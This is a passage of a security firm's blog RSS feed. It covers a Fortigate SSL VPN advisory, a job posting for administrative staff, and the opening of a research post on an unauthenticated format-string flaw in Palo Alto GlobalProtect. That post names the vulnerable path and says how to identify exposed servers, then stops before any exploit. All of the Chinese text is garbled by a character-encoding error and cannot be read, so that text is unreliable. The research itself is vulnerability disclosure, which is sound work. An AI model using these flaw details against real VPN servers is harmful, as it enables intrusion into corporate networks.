&lt;p&gt;ÈÄèÈÅé‰∏çÈúÄË™çË≠âÁöÑ‰ªªÊÑèËÆÄÊ™îÂïèÈ°å(CVE-2018-13379)Âä†‰∏äÁÆ°ÁêÜ‰ªãÈù¢‰∏äÁöÑ heap overflow(CVE-2018-13383)ÔºåÊÉ°ÊÑè‰ΩøÁî®ËÄÖÂèØÁõ¥Êé•ÂèñÂæó SSL VPN ÁöÑÊúÄÈ´òÊ¨äÈôê„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§Â§ñÔºåÊàëÂÄë‰πüÁôºÁèæ‰∫Ü‰∏ÄÂÄãÂÆòÊñπÂæåÈñÄ(CVE-2018-13382)ÔºåÂèØ‰ª•‰ªªÊÑè‰øÆÊîπ‰ΩøÁî®ËÄÖÂØÜÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®ÂõûÂ†± Fortigate ÂæåÔºåÂÆòÊñπÂ∑≤Èô∏Á∫å‰øÆÂæ©ÈÄô‰∫õÂº±ÈªûÔºåÂª∫Ë≠∞ Fortigate SSL VPN ÁöÑÁî®Êà∂Êõ¥Êñ∞Ëá≥ÊúÄÊñ∞Áâà„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Á¥∞ÁØÄ&quot;&gt;Á¥∞ÁØÄ&lt;/h3&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÊäÄË°ìÁ¥∞ÁØÄË´ãÂèÉÈñ±ÊàëÂÄëÁöÑ AdvisoryÔºö
&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;

&lt;p&gt;ÈÄôÁ≥ªÂàó VPN Á†îÁ©∂‰πüÂæóÂà∞‰∫Ü‰ªäÂπ¥ BlackHat 2019 Pwnie Awards ÁöÑ &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;pwnie for best server-side bug&lt;/a&gt;ÔºàÂπ¥Â∫¶ÊúÄ‰Ω≥‰º∫ÊúçÂô®ÊºèÊ¥ûÔºâ„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[Â∑≤ÁµêÊùü] DEVCORE ÂæµÊ±ÇË°åÊîøÂ∞àÂì°</title>
                <description>&lt;p&gt;Êà¥Â§´ÂØáÁàæÂç≥Â∞áÊªø‰∏ÉÂπ¥‰∫ÜÔºåÈÅéÂéªÊàëÂÄë‰∏çÊñ∑Âú∞ÈëΩÁ†îÈÄ≤ÈöéÊîªÊìäÊäÄÂ∑ßÔºåÁÇ∫Ë®±Â§öÂÆ¢Êà∂Êèê‰æõÈ´òÂìÅË≥™ÁöÑÊª≤ÈÄèÊ∏¨Ë©¶ÊúçÂãôÔºå‰πüÊàêÁÇ∫ÂÆ¢Êà∂ÊúÄ‰ø°Ë≥¥ÁöÑË≥áÂÆâ‰ºô‰º¥‰πã‰∏Ä„ÄÇÂú® 2017 Âπ¥ÊàëÂÄëÊõ¥ÊàêÁÇ∫Á¨¨‰∏ÄÂÄãÂú®Âè∞ÁÅ£Êé®Âá∫Á¥ÖÈöäÊºîÁ∑¥ÊúçÂãôÁöÑÊú¨ÂúüÂª†ÂïÜÔºåÈÄèÈÅéÁÑ°ÊâÄ‰∏çÁî®ÂÖ∂Ê•µÁöÑÈß≠ÂÆ¢ÊÄùÁ∂≠ÔºåÈô∏Á∫åÁÇ∫ÈõªÂ≠êÂïÜÂãô„ÄÅÊîøÂ∫úÈÉ®ÈñÄ„ÄÅÈáëËûçÊ•≠ËÄÖÂü∑Ë°åÊúÄÁúüÂØ¶‰∏îÂÖ®Èù¢ÁöÑÊîªÊìäÊºîÁ∑¥ÔºåÂêåÊôÇ‰πüÁ¥ØÁ©ç‰∫ÜË±êÂØåÁöÑÁ∂ìÈ©óËàáÊ°à‰æãÔºåÊàêÁÇ∫Âè∞ÁÅ£Á¥ÖÈöäÊºîÁ∑¥ÂØ¶ÂäõÊúÄÊ∑±ÂéöÁöÑÊúçÂãô‰æõÊáâÂïÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú® 2015 Âπ¥ÊàëÂÄëÊõæÁ∂ìÂÖ¨ÈñãÂæµÊ±Ç‰∏Ä‰ΩçË°åÊîøÂá∫Á¥ç‰∫∫ÊâçÔºåÂæå‰æÜÁ∂ìÈÅéÂ±§Â±§ÁöÑÂ±•Ê≠∑ÂØ©Ê†∏„ÄÅÁ≠ÜË©¶„ÄÅÈù¢Ë©¶ÔºåÁµÇÊñºÈ†ÜÂà©ÊâæÂà∞‰∏Ä‰ΩçÁ∂ìÈ©óË±êÂØå‰∏îÂÄºÂæó‰ø°Ë≥¥ÁöÑÁîüÊ¥ªÈß≠ÂÆ¢ÔºåÊàêÁÇ∫ÊàëÂÄëÊúÄÂº∑ËÄåÊúâÂäõÁöÑÂæåÂã§‰ºô‰º¥„ÄÇ‰ΩÜÊòØÈö®ËëóÂúòÈöä‰∫∫Êï∏Â¢ûÈï∑„ÄÅÊ•≠ÂãôË¶èÊ®°Â§ßÂπÖÂ¢ûÂä†„ÄÅ‰∫ãÂãôÂàÜÂ∑•Â∞àÊ•≠ÂåñÔºåË°åÊîøÈÉ®ÈñÄÁöÑÁúæÂ§öÂ∑•‰ΩúÂ∑≤Á∂ìÁÑ°Ê≥ïÁî±ÂñÆ‰∏Ä‰∫∫ÂäõÁç®Ëá™Ë≤†Ëç∑„ÄÇ&lt;/p&gt;

&lt;p&gt;Âõ†Ê≠§‰ªäÂπ¥ÊàëÂÄëÂÜçÂ∫¶ÂÖ¨ÈñãÊãõÂãüË°åÊîø‰∫∫ÊâçÔºåÂ∏åÊúõËÉΩÂ§†ÊâæÂà∞‰∏Ä‰ΩçË°åÊîøÂ∞àÂì°ÔºåÊì¥Â§ßÊàëÂÄëÁöÑÂæåÂã§ËÉΩÈáèÔºåÈûèÂõ∫Êà¥Â§´ÂØáÁàæÁöÑÂúòÈöä‰ΩúÊà∞ËÉΩÂäõÔºåËÆìÊàëÂÄëÊåÅÁ∫åÁÇ∫‰ºÅÊ•≠Êèê‰æõÊúÄÂÑ™Áï∞ÁöÑË≥áÂÆâÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈùûÂ∏∏Ê∏¥ÊúõÊÇ®ÁöÑÂä†ÂÖ•ÔºåËã•ÊÇ®ÊúâÊÑèÊàêÁÇ∫Êà¥Â§´ÂØáÁàæÁöÑ‰∏ÄÂì°ÔºåÂèØÂèÉËÄÉ‰∏ãÂàóËÅ∑Áº∫Á¥∞ÁØÄÔºö&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÂÖßÂÆπ&quot;&gt;Â∑•‰ΩúÂÖßÂÆπ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Â∫∂ÂãôÊÄßË°åÊîøÂ∑•‰Ωú 50%
    &lt;ul&gt;
      &lt;li&gt;‰∫∫Âì°Êé•ÂæÖÔºå‰æãÂ¶ÇÔºöÈõªË©±Êé•ËÅΩ„ÄÅ‰æÜË®™‰∫∫Âì°Êé•ÂæÖ&lt;/li&gt;
      &lt;li&gt;Êñá‰ª∂Êî∂ÁôºÔºå‰æãÂ¶ÇÔºöÈÉµÂãô‰ΩúÊ•≠„ÄÅÂø´ÈÅûÊúçÂãô&lt;/li&gt;
      &lt;li&gt;Ê™îÊ°àÁÆ°ÁêÜÔºå‰æãÂ¶ÇÔºöÂêçÁâáÊéÉÊèè„ÄÅÂêàÁ¥ÑÊéÉÊèè„ÄÅÁØÑÊú¨Ê™îÊ°àÊ†ºÂºèË™øÊï¥&lt;/li&gt;
      &lt;li&gt;Ë≥áÊñôËíêÈõÜÔºå‰æãÂ¶ÇÔºöÂêÑÈ°ûÂÖ¨Âè∏Ê•≠ÂãôÈúÄÊ±ÇË≥áÊñôÊü•Êâæ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Á∏ΩÂãôÂ∑•‰Ωú 20%
    &lt;ul&gt;
      &lt;li&gt;Ëæ¶ÂÖ¨ÂÆ§ÂêÑÈ°ûÁî®ÂìÅÊé°Ë≤∑&lt;/li&gt;
      &lt;li&gt;Ëæ¶ÂÖ¨ÂÆ§Áí∞Â¢ÉÁ∂≠Ë≠∑&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Êé°Ë≥ºÂ∑•‰Ωú 15%
    &lt;ul&gt;
      &lt;li&gt;Ë®≠ÂÇôÊé°Ë≥ºÁÆ°ÁêÜ&lt;/li&gt;
      &lt;li&gt;ÊúçÂãô‰æõÊáâÂïÜÁÆ°ÁêÜ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰∫∫‰∫ãÂ∑•‰Ωú 5%
    &lt;ul&gt;
      &lt;li&gt;‰øùÈö™‰∫ãÂãôÔºå‰æãÂ¶ÇÔºöÂúòÈ´î‰øùÈö™„ÄÅÊóÖÈÅä‰∏ç‰æøÈö™&lt;/li&gt;
      &lt;li&gt;Â∑ÆÊóÖË°åÁ®ãÔºå‰æãÂ¶ÇÔºö‰∫§ÈÄöÁ•®Âà∏Ë®ÇË≥º„ÄÅÁ∞ΩË≠âËæ¶ÁêÜ&lt;/li&gt;
      &lt;li&gt;ÊïôËÇ≤Ë®ìÁ∑¥ÂÆâÊéí&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∂‰ªñ‰∏ªÁÆ°‰∫§Ëæ¶‰∫ãÈ†Ö 10%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊôÇÈñì&quot;&gt;Â∑•‰ΩúÊôÇÈñì&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÂú∞Èªû&quot;&gt;Â∑•‰ΩúÂú∞Èªû&lt;/h3&gt;
&lt;p&gt;Âè∞ÂåóÂ∏Ç‰∏≠Â±±ÂçÄÂæ©ËààÂåóË∑Ø 168 Ëôü 10 Ê®ì
ÔºàÊç∑ÈÅãÂçó‰∫¨Âæ©ËààÁ´ô 8 ËôüÂá∫Âè£ÔºåËµ∞Ë∑ØÁ¥Ñ 3 ÂàÜÈêòÔºâ&lt;/p&gt;

&lt;h3 id=&quot;‰∫∫Ê†ºÁâπË≥™ÂÅèÂ•Ω&quot;&gt;‰∫∫Ê†ºÁâπË≥™ÂÅèÂ•Ω&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Á¥∞ÂøÉÂö¥Ë¨πÔºåËÉΩËÄêÂøÉÁöÑËôïÁêÜÁπÅÁë£ÁöÑÂ∫∂ÂãôÂ∑•‰Ωú„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏ªÂãïÁ©çÊ•µÔºåÁúãÂà∞ÊàëÂÄëÊ≤íÁôºÁèæÁöÑÁ¥∞ÁØÄÔºåË∂ÖË∂äÊàëÂÄëÊâÄÊúüÊúõÁöÑÂü∫Ê∫ñ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊáÇÂæóÊ∫ùÈÄöÂÇæËÅΩÔºåËÉΩÂêåÁêÜ‰ªñ‰∫∫ÔºåÊâæÂá∫ÂΩºÊ≠§ÂÖ±Ë≠ò„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊìÖÈï∑ÈÇèËºØÊÄùËÄÉÔºåÊáÇÂæóÈÄèÈÅéÊ∑∫È°ØÊòìÊáÇ‰∏îÊ¢ùÁêÜÊ∏ÖÊô∞ÁöÑÊñπÂºèÂÇ≥ÈÅîËá™Â∑±ÁöÑÊÉ≥Ê≥ï„ÄÇ&lt;/li&gt;
  &lt;li&gt;ËâØÂ•ΩÁöÑÊôÇÈñìÁÆ°ÁêÜËÉΩÂäõÔºå‰æùÊìö‰ªªÂãôÁöÑÂÑ™ÂÖàÈ†ÜÂ∫èÔºåÊúâÊïàÁéáÁöÑÂÆåÊàêÊØèÈ†Ö‰∫§Ëæ¶„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂãáÊñºÊé•ÂèóÊåëÊà∞‰∏îÂÖ∑ÂÇôËß£Ê±∫ÂïèÈ°åÁöÑËÉΩÂäõÔºåÂä™ÂäõÂÖãÊúçÊú™Áü•ÁöÑÈõ£È°å„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;Â∑•‰ΩúÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÈúÄÊúâ‰∏âÂπ¥‰ª•‰∏äË°åÊîøÁõ∏ÈóúÂ∑•‰ΩúÁ∂ìÈ©ó&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Google Sheets Êìç‰ΩúÔºå‰∏îÂÖ∑Áç®Á´ãÊí∞ÂØ´Ë©¶ÁÆóË°®ÂÖ¨ÂºèÁöÑËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÁøíÊÖ£‰ΩøÁî®Èõ≤Á´ØÊúçÂãôÔºåÂ¶ÇÔºöGoogle Drive, Dropbox ÊàñÂÖ∂‰ªñ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Âä†ÂàÜÊ¢ù‰ª∂&quot;&gt;Âä†ÂàÜÊ¢ù‰ª∂&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÊÇ®‰ΩøÁî®ÈÅéÂ∞àÊ°àÁÆ°ÁêÜÁ≥ªÁµ±ÔºåÂ¶ÇÔºöTrello, Basecamp, Redmine ÊàñÂÖ∂‰ªñ&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊÇ®Â∞áÊúÉ‰ΩøÁî®Â∞àÊ°àÁÆ°ÁêÜÁ≥ªÁµ±ÁÆ°ÁêÜÂπ≥Êó•‰ªªÂãô„ÄÇ&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊòØ MAC ‰ΩøÁî®ËÄÖ&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊÇ®Êú™‰æÜÁöÑÈõªËÖ¶ÊúÉÊòØ MACÔºåÊàëÂÄëÂ∏åÊúõÊÇ®Ë∂äÂø´È†ÜÊö¢‰ΩøÁî®ÈõªËÖ¶Ë∂äÂ•Ω„ÄÇ&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊòØÁîüÊ¥ªÈß≠ÂÆ¢&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;ÊÇ®‰∏çÈúÄË¶ÅÊúÉÂØ´Á®ãÂºèÔºå‰ΩÜÊÇ®ÁøíÊÖ£ËßÄÂØüÁîüÊ¥ª‰∏≠ÁöÑË¶èÂæãÔºå‰∏¶ÊÉ≥Ëæ¶Ê≥ïÂà©Áî®ÈÄô‰∫õË¶èÂæãÊúâÊïàÁéáÁöÑËß£Ê±∫ÂïèÈ°å„ÄÇ&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÁí∞Â¢É&quot;&gt;Â∑•‰ΩúÁí∞Â¢É&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÊÇ®ÊúÉÂú®‰∏ÄÂÄãÈñãÈóäÁöÑËæ¶ÂÖ¨Áí∞Â¢ÉÂ∑•‰Ωú
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ÊÇ®ÊúÉÊìÅÊúâ‰∏ÄÂºµ Aeron ‰∫∫È´îÂ∑•Â≠∏Ê§Ö
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Ë£úÊªøÈ£≤ÊñôÔºàÂè¶ÊúâÂíñÂï°Ê©üÔºâ„ÄÅÈõ∂È£üÔºåËÆìÊÇ®‰øùÊåÅÂøÉÊÉÖÊÑâÂø´
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ÂÖ¨Âè∏Êèê‰æõÈ£õÈè¢Ê©üËÆìÊÇ®ÁôºÊ¥©Â∞ç‰∏ªÁÆ°ÁöÑÊÄ®Ê∞£
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Á¶èÂà©&quot;&gt;ÂÖ¨Âè∏Á¶èÂà©&lt;/h3&gt;
&lt;p&gt;ÊàëÂÄëÊ≥®ÈáçÂÖ¨Âè∏ÊØè‰ΩçÂêå‰ªÅÁöÑË∫´ÂøÉÂÅ•Â∫∑ÔºåË´ãÂèÉËÄÉ‰ª•‰∏ãÁ¶èÂà©Âà∂Â∫¶Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‰ºëÂÅáÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Âà∞ËÅ∑Âç≥ÂèØÈ†êÊîØÁï∂Âπ¥Â∫¶Áâπ‰ºë&lt;/li&gt;
      &lt;li&gt;ÊØèÂπ¥‰∫îÂ§©ÂÖ®Ëñ™ÁóÖÂÅá&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁçéÈáëÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;‰∏âÁØÄÁ¶ÆÈáëÔºàÊò•ÁØÄ„ÄÅÁ´ØÂçàÁØÄ„ÄÅ‰∏≠ÁßãÁØÄÔºâ&lt;/li&gt;
      &lt;li&gt;ÁîüÊó•Á¶ÆÈáë&lt;/li&gt;
      &lt;li&gt;Â©öÂñ™Ë£úÂä©&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ºëÈñíÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Âì°Â∑•ÊóÖÈÅä&lt;/li&gt;
      &lt;li&gt;ËàíÂ£ìÊåâÊë©&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁæéÈ£üÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Èõ∂È£üÈ£≤Êñô&lt;/li&gt;
      &lt;li&gt;Âì°Â∑•ËÅöÈ§ê&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÅ•Â∫∑Á¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Âì°Â∑•ÂÅ•Â∫∑Ê™¢Êü•&lt;/li&gt;
      &lt;li&gt;ÈÅãÂãï‰∏≠ÂøÉÂÅ•Ë∫´Âà∏&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÈÄ≤‰øÆÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;ÂÖßÈÉ®ÊïôËÇ≤Ë®ìÁ∑¥&lt;/li&gt;
      &lt;li&gt;Â§ñÈÉ®ÈÄ≤‰øÆË™≤Á®ã&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∂‰ªñ
    &lt;ul&gt;
      &lt;li&gt;Â∞àÊ•≠ÁöÑÂÖ¨Âè∏ÂúòÈöä&lt;/li&gt;
      &lt;li&gt;ÊâÅÂπ≥ÁöÑÂÖßÈÉ®ÁµÑÁπî&lt;/li&gt;
      &lt;li&gt;È†ÜÊö¢ÁöÑÊ∫ùÈÄöÊ∞õÂúç&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëµ∑Ëñ™ÁØÑÂúç&quot;&gt;Ëµ∑Ëñ™ÁØÑÂúç&lt;/h3&gt;
&lt;p&gt;Êñ∞Âè∞Âπ£ 34,000 - 40,000 Ôºà‰øùË≠âÂπ¥Ëñ™ 14 ÂÄãÊúàÔºâ&lt;/p&gt;

&lt;h3 id=&quot;ÊáâÂæµÊñπÂºè&quot;&gt;ÊáâÂæµÊñπÂºè&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑÂ±•Ê≠∑‰ª• PDF Ê†ºÂºèÂØÑÂà∞¬†recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOC&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ê®ôÈ°åÊ†ºÂºèÔºö&lt;strong&gt;[ÊáâÂæµ] Ë°åÊîøÂ∞àÂì° ÊÇ®ÁöÑÂßìÂêç&lt;/strong&gt;ÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Ë°åÊîøÂ∞àÂì° ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®ÂÖ©È†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;Â∑•‰ΩúÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄëÊúÉÂú®ÂÖ©ÈÄ±ÂÖß‰∏ªÂãïËàáÊÇ®ËÅØÁπ´ÔºåÊãõÂãüÈÅéÁ®ã‰æùÂ∫èÁÇ∫Êõ∏Èù¢ÂØ©Ê†∏„ÄÅÁ∑ö‰∏äÊ∏¨È©ó‰ª•ÂèäÈù¢Ë©¶‰∏âÂÄãÈöéÊÆµ„ÄÇÊúÄÂø´Â∞áÊñºÂÖ´Êúà‰∏≠ÈÄ≤Ë°åÁ¨¨‰∫åÈöéÊÆµÁöÑÁ∑ö‰∏äÊ∏¨È©óÔºåÁÖ©Ë´ãËÄêÂøÉÁ≠âÂÄô„ÄÇ
Áî±ÊñºÊúÄËøëÊ•≠ÂãôËºÉÁÇ∫ÂøôÁ¢åÔºåËã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´í„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈÅ∏ÊìáÂÑ™ÂÖàÂú®ÈÉ®ËêΩÊ†ºÂÖ¨Â∏ÉÂæµÊâçË≥áË®äÔºåÊòØÂ∏åÊúõÊÇ®‰πüÂ∞çË≥áË®äÂÆâÂÖ®Ë≠∞È°åÊÑüËààË∂£ÔºåÂç≥‰Ωø‰∏çÊáÇÊäÄË°ì‰πüÊÉ≥ÁÇ∫Âè∞ÁÅ£Ë≥áÂÆâÁõ°‰∏ÄÈªûÂäõ„ÄÇÁÑ°Ë´ñÂ¶Ç‰ΩïÔºåÊàëÂÄëÈÉΩÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°ÔºåÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/07/23/devcore-201907-recruit/</link>
                <guid>https://devco.re/blog/2019/07/23/devcore-201907-recruit</guid>
                <pubDate>Tue, 23 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They‚Äôre exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.&lt;/p&gt;

&lt;p&gt;We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; talk:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt;!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Don‚Äôt worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.&lt;/p&gt;

&lt;p&gt;In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)&lt;/p&gt;

&lt;h2 id=&quot;the-story&quot;&gt;The story&lt;/h2&gt;

&lt;p&gt;In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/global-protect/login.esp&lt;/code&gt; on web root!&lt;/p&gt;

&lt;p&gt;About the vulnerability, we accidentally discovered it during our &lt;a href=&quot;https://devco.re/en/services/red-team/&quot;&gt;Red Team assessment services&lt;/a&gt;.  At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.&lt;/p&gt;

&lt;p&gt;We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] There are some exploit about the  Pan-OS management interface before such as the &lt;a href=&quot;https://www.exploit-db.com/exploits/43342&quot;&gt;CVE-2017-15944&lt;/a&gt; and the excellent &lt;a href=&quot;https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/&quot;&gt;Troppers16 paper&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_fel1x&quot;&gt;@_fel1x&lt;/a&gt;, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-bug&quot;&gt;The bug&lt;/h2&gt;

&lt;p&gt;The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sslmgr&lt;/code&gt;.&lt;/p&gt;

